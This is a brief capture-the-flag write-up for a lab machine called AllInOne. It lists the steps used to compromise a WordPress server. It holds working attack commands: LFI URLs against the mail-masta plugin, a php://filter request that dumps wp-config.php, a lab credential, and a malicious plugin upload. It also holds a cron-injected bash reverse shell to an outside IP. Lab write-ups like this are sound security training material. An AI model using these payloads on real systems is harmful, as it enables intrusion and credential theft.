# CTF Writeup: AllInOne

---

- Step 1: added <target_ip> to /etc/hosts & ran nmap scan --> 21,22 & 80 are open
- Step 2: ran gobuster --> /hackathons & /wordpress
- Step 3: made wpscan --url allinone.thm --> multiple exploits
--> decided for mail-maste LFI
- Step 4: LFI on endpoint: http://allinone.thm/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
- Step 5: --> user ubuntu & user elyana
- Step 6: made wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hw 0 http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=FUZZ
- Step 7: to check which files are displayable from the server on LFI --> made curl http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl= and checked all options out
- Step 8: Decided to view the wp-config.php file aswell, but this is only possible --> with base64.php filter
- Step 9: made curl http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
- Step 10: found creds of elyana:H@ckme@123
- Step 11: added new tool "wordpwn" into the arsenal --> made python wordpwn.py <machine_ip> 1337 Y
- Step 12: ran it and gained "malicious.zip" on local machine --> went to plugins and uploaded it
- Step 13: gained meterpreter & listener aswell --> opened up file on url: http://http://10.10.249.194/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php
- Step 14: gained rce as www-data --> elyana's user creds are hidden in the system.
- Step 15: made find / -user elyana -type f 2>/dev/null --> gained elyana's credentials in mysql file.
- Step 16: made cat /etc/crontabs --> writable script with root privs, which executes every min
- Step 17: added /bin/bash -c "/bin/bash -i >& /dev/tcp/10.21.156.104/4444 0>&1" and started up
an listener on local machine
- Step 18: Gained Root RCE --> retrieved flags and base64 decoded them

---

## Key Learnings

- Increased wordpress methodology
- Gained new tool to the arsenal
- Immensly increased LFI Knowledge and Methodology
- Increased Linux CLI Knowledge
